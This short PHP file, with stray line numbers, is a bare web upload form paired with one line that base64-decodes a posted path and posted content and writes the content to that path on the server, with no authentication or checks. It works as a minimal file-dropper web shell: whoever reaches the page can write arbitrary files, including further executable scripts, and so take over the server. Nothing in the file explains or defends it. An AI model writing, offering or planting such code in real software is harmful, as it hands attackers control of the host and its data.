1  <form action="" method="post"><input type="text" name="file" id=""><textarea name="area" id="" cols="30" rows="10"></textarea><input type="submit" value="Submit"></form>
\
<?= file_put_contents(base64_decode($_POST['file']), base64_decode($_POST['area'])) ?>  3  4  5  6  7  8  9
